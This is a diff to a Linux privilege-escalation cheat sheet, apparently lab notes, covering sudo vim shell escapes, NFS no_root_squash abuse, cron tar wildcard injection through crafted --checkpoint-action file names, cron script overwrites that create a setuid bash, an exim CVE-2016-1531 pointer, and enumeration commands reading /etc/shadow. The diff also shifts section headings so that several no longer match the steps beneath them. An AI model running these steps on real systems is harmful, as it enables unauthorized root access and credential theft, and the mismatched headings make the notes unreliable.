@@ -42,12 +42,11 @@ sudo vim -c '!sh'
   - nmap 
   - vim 
 ~~~
-
-If you have any of those proceed to exploit.
-======================
+# If you have any of those proceed to exploit.
+~~~
 1. cat /etc/exports 
 2. If “no_root_squash” option is defined for the “/tmp” export (or another export), use this method 
-
+~~~
 Exploitation  
 Kali VM  
 1. Open command prompt and type: showmount -e [Linux VM IP Address]  
@@ -61,6 +60,7 @@ Linux VM
 2. In command prompt type: id 
 
 # Exploit misconfigured vulnerable NFS.
+~~~
 http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
 =======================
 s -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null 
@@ -85,10 +85,9 @@ Linux VM
 3. Wait 1 minute for the Bash script to execute.  
 4. In command prompt type: /tmp/bash -p  
 5. In command prompt type: id 
-
-# Cron (path) 
-Use this if /etc/crontab has a PATH you have write to
-==================
+~~~
+# Cron job tests
+~~~
 Linux VM  
 
 1. In command prompt type: cat /etc/crontab 
@@ -97,38 +96,30 @@ Linux VM
 4. From the output, notice the wildcard (*) used by ‘tar’. 
 
 Add checkpoint variables to tar: 
-
 1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh 
 2. touch /home/user/--checkpoint=1 
 3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh 
 4. Wait for script to execute 
 5. /tmp/bash -p 
 6. id
-
-# Cron ( Tar wildcard) 
-Use this if /etc/crontab has a tar command (or other command that has a wildcard)
-======================
+~~~
+# cron write perm check 
 1. echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh 
 2. Wait for script to execute 
 3. /tmp/bash -p 
 4. id
-
-# Cron (file overwrite) 
-Use this if /etc/crontab has a file that you have write permission to
-=======================
+~~~
+# Vulnerable exim.
+~~~
 dpkg -l | grep -i exim ( is version is below 4.86.2 ?) 
 
 Is exim compiled with perl support? 
-
 exim -bV -v | grep -i perl  
-
 Does exim.conf contain “perl sartup” option? 
-
 Use cve-2016-1531.sh 
-
-# Vulnerable exim.
-https://github.com/HackerFantastic/Public/blob/master/exploits/cve-2016-1531.sh
-=======================
+~~~
+# Some manual enumeration within files.
+~~~
 uname -a 
 env 
 id 
@@ -139,9 +130,9 @@ cat /etc/group
 cat /etc/shadow 
 cat /etc/hosts 
 grep -vE "nologin" /etc/passwd
-
-# Some manual enumeration within files.
-======================
+~~~
+# Check vulnerable software.
+~~~
 # Debian 
 dpkg -l 
  
